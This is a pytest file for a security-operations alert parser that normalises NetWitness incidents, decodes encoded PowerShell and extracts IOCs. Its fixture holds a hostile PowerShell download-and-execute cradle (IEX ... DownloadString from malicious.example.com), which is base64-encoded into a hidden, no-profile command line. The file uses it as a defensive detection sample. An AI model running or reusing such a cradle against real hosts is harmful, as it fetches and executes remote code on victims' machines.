"""Tests for agents/parsing/parser_normaliser.py against a representative
NetWitness-shaped incident -- the canonical Parsing & Normalisation
implementation that workflow/engine.py::run_parsing() calls via
run_parser_normalisation_for_dashboard() (see workflow/engine.py's own
run_parsing() docstring)."""
from __future__ import annotations

import base64
import json
from pathlib import Path

from agents.parsing.parser_normaliser import (
    build_agent_friendly_processed_alert,
    build_standard_alert,
    run_parser_normalisation_for_dashboard,
)


def _encode(command: str) -> str:
    return base64.b64encode(command.encode("utf-16le")).decode()


MALICIOUS_COMMAND = (
    "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')"
)


def _representative_incident(*, with_powershell: bool = True) -> dict:
    event = {
        "ip_src": "10.0.0.5",
        "ip_dst": "8.8.8.8",
        "user_src": "jdoe",
        "alias_host": "WIN-HOST-1",
        "checksum_src": "d41d8cd98f00b204e9800998ecf8427e",
        "filename_src": "powershell.exe",
    }
    if with_powershell:
        event["param_src"] = f"powershell.exe -nop -w hidden -enc {_encode(MALICIOUS_COMMAND)}"
    return {
        "incident": {"id": "INC-TEST-9001", "title": "Suspicious PowerShell Execution", "priority": "High"},
        "alerts": [
            {
                "id": "ALERT-TEST-1",
                "title": "Suspicious PowerShell Execution",
                "created": "2026-09-15T10:00:00Z",
                "severity": 92,
                "originalAlert": {"events": [event]},
            }
        ],
    }


def test_build_standard_alert_produces_expected_normalised_contract(tmp_path: Path):
    result = build_standard_alert(_representative_incident(), output_dir=str(tmp_path))

    assert result["parser_status"] == "completed"
    assert result["alert_count"] == 1
    normalised = result["normalised_alert"]
    assert normalised is not None

    summary = normalised["alert_summary"]
    assert summary["incident_id"] == "INC-TEST-9001"
    assert summary["alert_id"] == "ALERT-TEST-1"
    assert summary["alert_name"] == "Suspicious PowerShell Execution"

    network = normalised["network_indicators"]
    assert "10.0.0.5" in network["source_ips"]
    assert "8.8.8.8" in network["destination_ips"]

    users = normalised["user_and_host_indicators"]
    assert "WIN-HOST-1" in users["hostnames"]
    assert "jdoe" in users["all_usernames"]

    files = normalised["file_indicators"]
    assert "d41d8cd98f00b204e9800998ecf8427e" in files["file_hashes"]

    assert "compatibility_view" in normalised
    assert normalised["compatibility_view"]["incident_id"] == "INC-TEST-9001"
    assert normalised["compatibility_view"]["alert_id"] == "ALERT-TEST-1"

    # Design rule from this file's own header: evidence paths never leak
    # into the normalised alert.
    assert "raw_alert_debug" not in normalised


def test_build_standard_alert_wires_powershell_decoder_when_encoded_command_present(tmp_path: Path):
    result = build_standard_alert(_representative_incident(with_powershell=True), output_dir=str(tmp_path))
    powershell = result["normalised_alert"]["powershell_analysis"]

    assert powershell["encoded_command_present"] is True
    assert powershell["decode_status"] == "success"
    assert MALICIOUS_COMMAND in powershell["decoded_commands"]
    assert "malicious.example.com" in powershell["extracted_iocs"]["domains"]
    # MITRE technique IDs from powershell_decoder must flow into the
    # normalised alert's own threat_context, not be silently dropped.
    assert set(powershell["mitre_mapping"][0].keys()) == {"technique_id", "technique"}
    threat_ids = result["normalised_alert"]["threat_context"]["mitre_technique_ids"]
    assert any(tid.startswith("T1") for tid in threat_ids)


def test_build_standard_alert_powershell_absent_is_not_fabricated(tmp_path: Path):
    result = build_standard_alert(_representative_incident(with_powershell=False), output_dir=str(tmp_path))
    powershell = result["normalised_alert"]["powershell_analysis"]

    assert powershell["encoded_command_present"] is False
    assert powershell["decode_status"] == "not_found"
    # prune_empty_and_null_values() strips empty-list values before the
    # normalised alert is returned, so an absent decode leaves these keys
    # missing rather than present-but-empty.
    assert powershell.get("decoded_commands", []) == []
    assert powershell.get("suspicious_behaviours", []) == []


def test_build_agent_friendly_processed_alert_flattens_identity_and_powershell(tmp_path: Path):
    result = build_standard_alert(_representative_incident(), output_dir=str(tmp_path))
    processed = build_agent_friendly_processed_alert(result["normalised_alert"])

    assert processed["incident_id"] == "INC-TEST-9001"
    assert processed["alert_id"] == "ALERT-TEST-1"
    assert processed["hostname"] == "WIN-HOST-1"
    assert processed["username"] == "jdoe"
    assert processed["source_ip"] == "10.0.0.5"
    assert processed["powershell_decode_status"] == "success"
    assert processed["decoded_powershell_command"] == MALICIOUS_COMMAND


def test_run_parser_normalisation_for_dashboard_end_to_end(tmp_path: Path):
    result = run_parser_normalisation_for_dashboard(_representative_incident(), output_dir=tmp_path)

    assert result["status"] == "completed"
    assert result["normalised_alert"]["alert_summary"]["alert_id"] == "ALERT-TEST-1"
    assert result["processed_alert"]["incident_id"] == "INC-TEST-9001"
    assert result["important_extracted_fields"]["alert_id"] == "ALERT-TEST-1"
    assert result["parser_summary_card"]["powershell_decode_status"] == "success"

    # The identity guard (parser_context_guard.py) must run and pass for
    # a normal, non-stale parse.
    assert result["identity_validation"]["passed"] is True
    assert result["input_identity"]["alert_id"] == "ALERT-TEST-1"

    # Output artefacts genuinely written to disk under output_dir.
    assert (tmp_path / "processed_alert.json").exists()
    written = json.loads((tmp_path / "processed_alert.json").read_text())
    assert written["alert_id"] == "ALERT-TEST-1"


# ---------------------------------------------------------------------------
# Bare "incident-list" shape -- no nested "alerts"/"events" at all, only the
# incident-level alertMeta block. This is the REAL shape every case in this
# repo's demo database actually has (confirmed against the live soc_incidents
# .db: 5000/5000 sampled incidents had no "alerts" key; alertMeta only ever
# carried SourceIp/DestinationIp). Regression coverage for the bug where
# extract_alert_values_fast() only read per-event fields and silently
# dropped alertMeta entirely, making every such incident parse as "generic"
# with 0 raw events even when SourceIp/DestinationIp genuinely existed.
# ---------------------------------------------------------------------------

def _bare_incident_list_record(**overrides) -> dict:
    record = {
        "id": "INC-BARE-1",
        "title": "High Risk Alerts: ESA for 192.168.10.210",
        "priority": "High",
        "riskScore": 70,
        "alertMeta": {"SourceIp": ["192.168.10.210"], "DestinationIp": ["188.40.170.197"]},
    }
    record.update(overrides)
    return record


def test_build_standard_alert_extracts_network_from_alert_meta_without_events(tmp_path: Path):
    """A bare incident-list record (no alerts/events array) must still
    surface its genuinely-present alertMeta network evidence, instead of
    silently discarding it and falling back to an all-empty "generic"
    result -- this was the actual INC-53027 bug."""
    result = build_standard_alert(_bare_incident_list_record(), output_dir=str(tmp_path))
    normalised = result["normalised_alert"]

    context = normalised["observed_data_context"]
    assert context["has_network_data"] is True
    assert context["primary_data_source"] == "network"
    assert context["observed_data_types"] == ["network"]

    network = normalised["network_indicators"]
    assert network["source_ips"] == ["192.168.10.210"]
    assert network["destination_ips"] == ["188.40.170.197"]

    assert normalised["ioc_summary"]["ips"] == ["192.168.10.210", "188.40.170.197"]
    assert set(normalised["threat_context"]["related_iocs"]) == {"192.168.10.210", "188.40.170.197"}

    # Nothing fabricated: no hostname/username/file/process/event evidence
    # exists anywhere in this input, so those sections must NOT appear.
    assert "identifiers" not in normalised
    assert "user_and_host_indicators" not in normalised
    assert "file_indicators" not in normalised
    assert "process_indicators" not in normalised
    assert "normalised_events" not in normalised


def test_build_standard_alert_alert_meta_hostname_username_command_line(tmp_path: Path):
    """Defensive coverage for the other alertMeta fields FIELD_ALIASES has
    always documented (HostName/UserName/CommandLine) -- this NetWitness
    deployment's own demo data never populates them, but another
    deployment's incident-list export might."""
    record = _bare_incident_list_record(alertMeta={
        "SourceIp": ["192.168.10.210"], "DestinationIp": ["188.40.170.197"],
        "HostName": ["WIN-HOST-9"], "UserName": ["jdoe"],
        "CommandLine": ["powershell.exe -Command Get-Process"],
    })
    result = build_standard_alert(record, output_dir=str(tmp_path))
    normalised = result["normalised_alert"]

    assert normalised["user_and_host_indicators"]["hostnames"] == ["WIN-HOST-9"]
    assert normalised["user_and_host_indicators"]["all_usernames"] == ["jdoe"]
    assert normalised["process_indicators"]["command_lines"] == ["powershell.exe -Command Get-Process"]
    assert normalised["observed_data_context"]["has_endpoint_data"] is True


def test_build_standard_alert_stays_generic_when_truly_no_evidence(tmp_path: Path):
    """When the raw source genuinely has no extractable evidence at all
    (not even alertMeta), the parser must still complete safely and stay
    honestly 'generic' -- not crash, and not invent evidence."""
    record = {"id": "INC-EMPTY-1", "title": "Untitled alert"}
    result = build_standard_alert(record, output_dir=str(tmp_path))
    normalised = result["normalised_alert"]

    assert result["parser_status"] == "completed"
    assert normalised["observed_data_context"]["primary_data_source"] == "generic"
    assert "network_indicators" not in normalised
    assert "ioc_summary" not in normalised
